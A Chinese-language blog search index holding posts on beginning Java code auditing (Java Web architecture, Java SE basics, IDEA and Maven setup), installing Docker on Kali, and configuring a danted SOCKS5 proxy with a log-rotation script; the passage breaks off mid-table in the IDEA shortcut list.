<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Java代码审计（三）——Java Web架构</title>
    <link href="/2023/09/18/blog0036-Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%89%EF%BC%89-Java%20Web/"/>
    <url>/2023/09/18/blog0036-Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%89%EF%BC%89-Java%20Web/</url>
    
    <content type="html"><![CDATA[<p>在上一章节，我们学习了Java SE的基础语法。</p><p>接下来就正式进入了Java Web的学习，我们会从Java Web的架构讲起，并重点介绍servlet、tomcat和JSP技术。</p><span id="more"></span><h2 id="java-web-架构">1、Java Web 架构</h2><p>首先，我们明确Web应用的基本架构，也为了方便我们后续更好地理解Java Web。</p><p><strong>浏览器</strong>：渲染前端页面，可以执行服务端下发的javascript脚本</p><p><strong>Web应用服务器</strong>：也可以叫Web应用容器/服务器软件，常见的Tomcat、Weblogic等。当然，我们也可以将tomcat和nginx的反向代理功能结合作为一个整体的Web应用服务器。</p><p>Web应用服务器的作用主要在<strong>用户和后端程序间做数据处理</strong>，起到一个桥梁作用，同时也用于管理后端应用程序进程。</p><p>（我们在配置php的时候，apache + php_fpm模块组成的Web应用服务器往往都是自带的，因此不需要额外配置。）</p><p><strong>Web后端程序</strong>：这里就是我们写的Java代码了。比如Servlet类，用来处理用户的请求以及响应。</p><h2 id="servlet">2、Servlet</h2><p>在Sun的Java Servlet规范中，对Java Web应用作了这样定义：“JavaWeb应用由一组Servlet、HTML页、类、以及其它可以被绑定的资源构成。它可以在各种供应商提供的实现Servlet规范的 <strong>Servlet容器</strong> 中运行。”</p><p>下图是基本的Java Web响应流程。需要注意的是，JSP在运行时也会被编译为<code>Servlet</code>类。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0032/image-20211128141044514.png" alt="img" /></p><p>我们常见的Servelet容器有：Tomcat、Weblogic等等。</p><h2 id="tomcat">3、Tomcat</h2><p>Tomcat是一款开源的Servelet容器，在实际开发中的使用非常广泛。</p><p>对于Tomcat的目录结构，我们有如下的说明。</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>notes</tag>
      
      <tag>Code Audit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kali2021 docker安装配置</title>
    <link href="/2023/09/06/blog0035-kali2021-docker%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/"/>
    <url>/2023/09/06/blog0035-kali2021-docker%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>记录一下kali 2021的docker安装过程</p><p>后续持续更新一些docker常用的命令</p><span id="more"></span><h2 id="安装证书-https-dirmngr">1、安装证书 https dirmngr</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt-get update <br>apt-get install -y apt-transport-https ca-certificates <br>apt-get install dirmngr<br></code></pre></td></tr></table></figure><h2 id="密钥与更新源">2、密钥与更新源</h2><p>echo可能会权限不够，可以先切换到root用户完成该命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl -fsSL https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/gpg | sudo apt-key add -<br>echo &#x27;deb https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable&#x27; | sudo tee /etc/apt/sources.list.d/docker.list<br></code></pre></td></tr></table></figure><h2 id="安装docker">3、安装docker</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apt install docker.io<br></code></pre></td></tr></table></figure><h2 id="用户添加docker组">4、用户添加docker组</h2><p>将kali用户添加至docker组</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo usermod -aG docker kali<br></code></pre></td></tr></table></figure><p>添加完之后记得重新登录，比如注销再登录</p><h2 id="检查安装">5、检查安装</h2><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl status docker</span><br><span class="hljs-attribute">docker -v</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>docker</tag>
      
      <tag>kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>danted socks5代理服务器配置</title>
    <link href="/2023/09/06/blog0034-danted-socks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/"/>
    <url>/2023/09/06/blog0034-danted-socks5%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>最近研究了一下如何搭建socks5代理服务器，选择了danted做了一些分析。</p><p>不过danted的官网的配置有些是错的，很多博客说的也不是非常详细，因此自己结合官网说明和实践测试，最后整了一篇文章。</p><h2 id="目标">目标</h2><ol type="1"><li>实现身份认证访问代理服务器</li><li>实现白名单目标服务器访问</li><li>按天分割日志</li></ol><h2 id="danted命令">1、danted命令</h2><h3 id="安装">1.1、安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt update<br>sudo apt install dante-server<br></code></pre></td></tr></table></figure><h3 id="运行">1.2、运行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">systemctl start danted.service   // 运行<br>systemctl restart danted.service// 重启<br></code></pre></td></tr></table></figure><h2 id="重要配置解读">2、重要配置解读</h2><p>官网主页：<a href="http://www.inet.no/dante/doc/1.4.x/config/index.html">Dante官方配置</a></p><p>服务器设置</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">logoutput日志输出位置，可以使用stdout/文件名<br>注意: danted的日志不支持输出到/var/<span class="hljs-keyword">log</span>目录下，官网的配置文档有误<br> 建议的形式是在根目录下额外开一个/danted目录来做日志文件夹<br>参考链接:https://www.linuxquestions.org/questions/linux-software<span class="hljs-number">-2</span>/dante-socks-<span class="hljs-keyword">server</span>-<span class="hljs-keyword">not</span>-running-<span class="hljs-keyword">as</span>-root-<span class="hljs-keyword">no</span>-<span class="hljs-keyword">access</span>-<span class="hljs-keyword">to</span>-var-<span class="hljs-keyword">log</span><span class="hljs-number">-4175674993</span>/<br><br><span class="hljs-type">internal</span>用于指定代理服务器监听的接口（或地址）和端口。<br>即客户端连接的地址，可以使用IP或者网卡(如eth0)来代指<br><br><span class="hljs-keyword">external</span>用于指定代理服务器向目标服务器发起连接的接口<br>可以使用IP或者网卡名称来指代<br><br>socksmethodsocks代理服务采用的身份认证方式<br><br>clientmethod客户端连接时采用的身份认证（不设置即可）<br><br><span class="hljs-keyword">user</span>.privileged需要使用特权的时候，使用的用户权限<br><span class="hljs-keyword">user</span>.unprivileged 不需要特权的时候，使用的用户权限<br><br></code></pre></td></tr></table></figure><p>流量设置</p><p>client pass，默认采用正向代理方式，控制哪些客户端可以连接（类似防火墙的访问控制列表），一般直接放行即可。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript">client pass &#123;<br>        <span class="hljs-keyword">from</span>: <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/<span class="hljs-number">0</span> <span class="hljs-keyword">to</span>: <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/<span class="hljs-number">0</span><br>        <span class="hljs-built_in">log</span>: <span class="hljs-keyword">error</span> <span class="hljs-comment"># connect disconnect tcpinfo iooperation</span><br>&#125;<br></code></pre></td></tr></table></figure><p>socks pass，默认采用正向代理方式，控制客户端和目标服务器的白名单</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript">socks pass &#123;<br>    <span class="hljs-keyword">from</span>: <span class="hljs-number">192.168</span><span class="hljs-number">.166</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span> <span class="hljs-keyword">to</span>: www.ichunqiu.com<br>    <span class="hljs-built_in">log</span>: <span class="hljs-keyword">error</span> connect disconnect <span class="hljs-comment"># tcpinfo </span><br>&#125;<br></code></pre></td></tr></table></figure><p>日志设置</p><p>在client pass和socks pass中，默认输出的日志是info，不需要额外的设置。</p><p>当然也可以自己选择增加error、connect、disconnect、tcpinfo、iooperation这五个种额外输出。</p><h2 id="配置文件样例">3、配置文件样例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs conf">#日志保存位置<br>errorlog: syslog<br>logoutput: /danted/sockd.log<br><br>#特权&amp;非特权<br>user.privileged: root<br>user.unprivileged: nobody<br><br>internal: 0.0.0.0 port = 1080<br>external: 10.255.200.72<br><br># method: username<br>socksmethod: username<br><br>#允许来自内部的用户访问dante代理服务器<br>client pass &#123;<br>        from: 0.0.0.0/0 to: 0.0.0.0/0<br>        log: error # connect disconnect tcpinfo iooperation<br>&#125;<br><br>#允许访问的外部指定地址<br>socks pass &#123;<br>    from: 192.168.166.0/24 to: www.ichunqiu.com<br>    log: error connect disconnect # tcpinfo <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="日志切割">4、日志切割</h2><p>日志切割采用定时任务完成</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0 </span>* * * * /bin/bash -c <span class="hljs-string">&quot;/danted/daily_log.sh&quot;</span><br></code></pre></td></tr></table></figure><p>对应的daily_log.sh的文件内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 设置日志文件路径</span><br>log_file=&quot;/danted/sockd.log&quot;<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 获取当前日期</span><br>current_date=$(date +&quot;%Y-%m-%d&quot;)<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 设置保存目录</span><br>log_dir=&quot;/danted&quot;<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 构建新的日志文件名</span><br>new_log_file=&quot;$log_dir/sockd_$current_date.log&quot;<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 检查日志目录是否存在，如果不存在则创建</span><br>if [ ! -d &quot;$log_dir&quot; ]; then<br>    mkdir -p &quot;$log_dir&quot;<br>fi<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 判断日志文件是否存在</span><br>if [ -f &quot;$log_file&quot; ]; then<br>    # 备份并重命名日志文件<br>    cp &quot;$log_file&quot; &quot;$new_log_file&quot;<br>    # 清空原日志文件<br>    echo &quot;&quot; &gt; &quot;$log_file&quot;<br>fi<br></code></pre></td></tr></table></figure><h2 id="小尾巴">5、小尾巴</h2><p>当然上面还留了一个问题，danted 的访问控制基于IP而不是用户。danted本身无法根据用户身份实现对目标服务器的访问控制。</p><p>比如我希望A用户只能通行www.baidu.com，B用户只能通行www.qq.com，这个danted目前是做不到的，除非A、B用户的IP是固定的。</p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>代理</tag>
      
      <tag>socks5</tag>
      
      <tag>服务器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码审计（二） Java SE基础学习</title>
    <link href="/2023/09/04/blog0033-Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%BA%8C%EF%BC%89-Java-SE%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/09/04/blog0033-Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%BA%8C%EF%BC%89-Java-SE%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>上一节，主要记录了IDEA配置基础的Java项目，属于相对比较繁琐的内容。</p><p>这一节，将会针对Java SE的基础语法进行说明。网络上已经有很多非常成熟的Java SE的博客，因此这一篇后续大概随缘更新。</p><span id="more"></span><h2 id="跨平台">1、跨平台</h2><p>Java是一种跨平台的语言，因为在系统与代码之间，由JVM虚拟机完成了中间的编译和运行。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20211123223724522.png" /></p><h2 id="自动gc">2、自动GC</h2><p>Java在底层实现了自动垃圾回收，当然也就不可避免的带来了一部分的性能损失，不过普通程序员完全没必要担心这些。</p><p>JVM提供一种系统级线程跟踪存储空间的分配情况。并在JVM空闲时，检查并释放那些可被释放的存储空间。</p><h2 id="标识符">3、标识符</h2><p>标识符：</p><ol type="1"><li>Java 对各种变量、方法和类等要素命名时使用的字符序列称为标识符</li><li>（2）<strong>凡是自己可以起名字的地方都叫标识符。</strong></li></ol><p>定义合法标识符规则：</p><ol type="1"><li>由英文字母大小写，数字：0-9 ，_或 $ 组成。在开发中常用大驼峰来完成变量的命名。</li><li>数字不可以开头。</li><li><strong>不可以使用关键字和保留字</strong>。</li><li><strong>Java中严格区分大小写，长度无限制</strong>。</li><li>标识符不能包含空格。</li></ol><h2 id="数据类型">4、数据类型</h2><h3 id="存储">4.1、存储</h3><p>基本数据类型，直接存储在栈上。</p><p>引用数据类型的地址存储在栈上，根据地址从堆上找到对应的值</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0033/image-20220220152824939.png" /></p><p>下面这段代码实现了打印变量在内存中的地址。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo01</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> <span class="hljs-keyword">var</span> = <span class="hljs-number">123</span>;<br>        String name = <span class="hljs-string">&quot;Hello world!&quot;</span>;<br>        <span class="hljs-keyword">int</span> VarAddress = (System.identityHashCode(<span class="hljs-keyword">var</span>));<br>        <span class="hljs-keyword">int</span> NameAddress = System.identityHashCode(name);<br>        System.out.println(<span class="hljs-string">&quot;0x&quot;</span> + Integer.toHexString(VarAddress));<br>        System.out.println(<span class="hljs-string">&quot;0x&quot;</span> + Integer.toHexString(NameAddress));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="自动类型转换">4.2、自动类型转换</h3><ul><li>有多种类型的数据混合运算时，系统首先自动将所有数据转换成容量最大的那种数据类型，然后再进行计算.</li><li>byte,short,char之间不会相互转换，他们三者在计算时首先转换为int类型。</li><li>当把任何基本类型的值和字符串值进行连接运算时(+)，基本类型的值将自动转化为字符串类型.</li></ul><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0033/image-20211126102455811.png" /></p><h3 id="强制类型转换">4.3、强制类型转换</h3><ul><li>自动类型转换的逆过程，将容量大的数据类型转换为容量小的数据类型。使用时要加上强制转换符（()），但可能造成精度降低或溢出,格外要注意。</li><li>通常，字符串不能直接转换为基本类型，但通过基本类型对应的包装类则可以实现把字符串转换成基本类型。如： String a = “43”; int i = Integer.parseInt(a);</li><li>boolean类型不可以转换为其它的数据类型。</li></ul><p>使用反射获取到变量的数据类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo02</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">getType</span><span class="hljs-params">(Object c)</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> c.getClass().getTypeName();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">char</span> a = <span class="hljs-string">&#x27;a&#x27;</span>;<br>        <span class="hljs-keyword">int</span> c = (<span class="hljs-keyword">int</span>)a;<br>        String NumString = <span class="hljs-string">&quot;43&quot;</span>;<br>        <span class="hljs-keyword">int</span> num = Integer.parseInt(NumString);<br>        System.out.println(getType(NumString) + <span class="hljs-string">&quot;--&gt;&quot;</span> +getType(num));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="运算符">5、运算符</h2><h3 id="算术运算符">5.1、算术运算符</h3><p>这一部分基本和C++类似，因此也不需要额外的说明。</p><table><thead><tr class="header"><th><strong>运算符</strong></th><th><strong>运算</strong></th><th><strong>范例</strong></th><th><strong>结果</strong></th></tr></thead><tbody><tr class="odd"><td><strong>+</strong></td><td>正号</td><td>+3</td><td>3</td></tr><tr class="even"><td><strong>-</strong></td><td>负号</td><td>b=4; -b</td><td>-4</td></tr><tr class="odd"><td><strong>+</strong></td><td>加</td><td>5+5</td><td>10</td></tr><tr class="even"><td><strong>-</strong></td><td>减</td><td>6-4</td><td>2</td></tr><tr class="odd"><td>*</td><td>乘</td><td>3*4</td><td>12</td></tr><tr class="even"><td><strong>/</strong></td><td>除</td><td>5/5</td><td>1</td></tr><tr class="odd"><td><strong>%</strong></td><td>取模</td><td>5%5</td><td>0</td></tr><tr class="even"><td>++ ++</td><td>自增（前）：先运算后取值自增（后）：先取值后运算</td><td>a=2;b=a; a=2;b=a;</td><td>a=3;b=3 a=3;b=2</td></tr><tr class="odd"><td><strong>- -</strong> <strong>- -</strong></td><td>自减（前）：先运算后取值 自减（后）：先取值后运算</td><td>a=2;b=- -a a=2;b=a- -</td><td>a=1;b=1 a=1;b=2</td></tr><tr class="even"><td><strong>+</strong></td><td>字符串拼接</td><td>“He”+”llo”</td><td>“Hello”</td></tr></tbody></table><p>...未完待续</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>notes</tag>
      
      <tag>Code Audit</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java代码审计（一） IDEA环境配置</title>
    <link href="/2023/09/03/blog0031-Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%80%EF%BC%89-IDEA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <url>/2023/09/03/blog0031-Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%88%E4%B8%80%EF%BC%89-IDEA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<p>接下来将会更新一系列关于Java代码审计的内容，希望能够坚持下去吧。</p><p>今天是IDEA的基础配置。希望下次不要再翻各种博客找到能用的配置文章吧。</p><p>这里使用的IDEA版本是2022.1的版本</p><span id="more"></span><h2 id="一javase项目配置">一、JavaSE项目配置</h2><p>JavaSE的IDEA创建相对较为简单，点击创建项目</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20230903192123582.png" alt="image-20230903192123582" /></p><p>在新建的项目中，src -&gt; new Java Class，可以创建Java类对象，完成编程操作。</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20230903192718492.png" alt="image-20230903192718492" /></p><h2 id="二javase-tomcat配置web">二、JavaSE + tomcat配置Web</h2><p>我们在刚刚的JavaSE项目的基础上，结合tomcat搭建Java Web应用。</p><h3 id="配置项目属性">2.1、配置项目属性</h3><p>点击 <code>File</code> -&gt; <code>Project structure</code></p><p>选择<code>Project</code>配置JDK的版本</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20230904155714764.png" alt="image-20230904155714764" /></p><p>选择<code>Modules</code>，指定运行的模板</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20230904160038598.png" alt="image-20230904160038598" /></p><p>选择<code>Libraries</code>可以选择导入的库，当然更好的形式是使用maven来部署</p><p>选择<code>Artifacts</code>，指定部署模式，这里使用war包的形式</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20230904160153646.png" alt="image-20230904160153646" /></p><h3 id="配置tomcat">2.2、配置Tomcat</h3><p>单击右上角<code>Add configuration</code></p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20230904160512657.png" alt="image-20230904160512657" /></p><p>点击<code>+</code>号后选择tomcat完成项目部署</p><p>注意配置deployment、port等相关信息</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20230904160620246.png" alt="image-20230904160620246" /></p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20230904160956617.png" alt="image-20230904160956617" /></p><h2 id="三javaee项目">三、JavaEE项目</h2><p>创建JavaEE项目，一次性配置tomcat+maven</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20230904161053521.png" alt="image-20230904161053521" /></p><p>选择Java EE的版本，并且导入外部库</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20230904161126266.png" alt="image-20230904161126266" /></p><p>项目目录如下</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20230904161612726.png" alt="image-20230904161612726" /></p><p>点击右上角运行，就可以完成相应的配置。</p><h2 id="四java-spring">四、Java + Spring</h2><p>创建Java EE项目时选择Spring框架</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20230904162243806.png" alt="image-20230904162243806" /></p><h2 id="五maven相关">五、Maven相关</h2><h3 id="普通项目导入maven">5.1、普通项目导入maven</h3><p>右键单击我的项目，选择<code>Add Framework Support</code>，添加Maven</p><p><a href="https://blog.csdn.net/IT_model/article/details/88815258">普通项目导入Maven</a></p><h3 id="maven仓库配置">5.2、maven仓库配置</h3><p>选择<code>File</code> -&gt; <code>settings</code> -&gt; <code>Build</code> -&gt; <code>maven</code>，配置本地的maven仓库</p><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0031/image-20230904162751524.png" alt="image-20230904162751524" /></p><h3 id="maven配置本地仓库镜像源">5.3、maven配置本地仓库/镜像源</h3><p>在maven安装目录下的<code>conf/settings.xml</code>，配置一些参数</p><p>配置本次包存储位置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">localRepository</span>&gt;</span>D:\MySoftware\apache-maven-3.9.2\repository<span class="hljs-tag">&lt;/<span class="hljs-name">localRepository</span>&gt;</span><br></code></pre></td></tr></table></figure><p>创建maven项目常常会遇到速度很慢的情况，因此需要替换一下maven源。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">mirror</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>alimaven<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>aliyun maven<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span><br>    http://maven.aliyun.com/nexus/content/groups/public/<br>  <span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">mirrorOf</span>&gt;</span>central<span class="hljs-tag">&lt;/<span class="hljs-name">mirrorOf</span>&gt;</span>        <br><span class="hljs-tag">&lt;/<span class="hljs-name">mirror</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0033/image-20230906112338376.png" alt="image-20230906112338376" /></p><h2 id="五idea快捷键列表">五、IDEA快捷键列表</h2><table><thead><tr class="header"><th>动作</th><th>快捷键</th><th>说明</th></tr></thead><tbody><tr class="odd"><td>Move Caret to Code Block End</td><td>Ctrl+]</td><td>诸如{}围起来的代码块，使用该快捷键可以快速跳转至代码块的结尾处</td></tr><tr class="even"><td>Move Caret to Code Block Start</td><td>Ctrl+[</td><td>同上，快速跳至代码块的开始出</td></tr><tr class="odd"><td>Complete Current Statement</td><td><strong>Ctrl+Shift+Enter</strong></td><td>将输入的if、for、函数等等补上{}或者;使代码语句完整</td></tr><tr class="even"><td>Start New Line</td><td><strong>Shift+Enter</strong></td><td>在当前行的下方开始新行</td></tr><tr class="odd"><td>Start New Line Before Current</td><td><strong>Ctrl+Alt+Enter</strong></td><td>在当前行上方插入新行</td></tr><tr class="even"><td>Delete to Word End</td><td><strong>Ctrl+Delete</strong></td><td>删除光标所在至单词结尾处的所有字符</td></tr><tr class="odd"><td>Delete to Word Start</td><td>Ctrl+BackSpace</td><td>删除光标所在至单词开头的所有字符</td></tr><tr class="even"><td>Move Caret to Previous Word</td><td>Ctrl+向左箭头</td><td>将光标移至前一个单词</td></tr><tr class="odd"><td>Move Caret to Next Word</td><td>Ctrl+向右箭头</td><td>将光标移至后一个单词</td></tr><tr class="even"><td>Scroll Up</td><td>Ctrl+向上箭头</td><td>向上滚动一行</td></tr><tr class="odd"><td>Scroll Down</td><td>Ctrl+向下箭头</td><td>向下滚动一行</td></tr><tr class="even"><td>Extend Selection</td><td><strong>Ctrl+W</strong></td><td>选中整个单词</td></tr><tr class="odd"><td>Toggle Case</td><td>Ctrl+Shift+U</td><td>切换大小写</td></tr><tr class="even"><td>Undo</td><td><strong>Ctrl+Z</strong></td><td>撤销</td></tr><tr class="odd"><td>Redo</td><td>Ctrl+Shift+Z</td><td>重做</td></tr><tr class="even"><td>Cut</td><td><strong>Ctrl+X</strong></td><td>剪切</td></tr><tr class="odd"><td>Copy</td><td><strong>Ctrl+C</strong></td><td>复制</td></tr><tr class="even"><td>Paste</td><td><strong>Ctrl+V</strong></td><td>粘贴</td></tr><tr class="odd"><td>Join Lines</td><td>Ctrl+Shift+J</td><td>将选中的行合并成一行</td></tr><tr 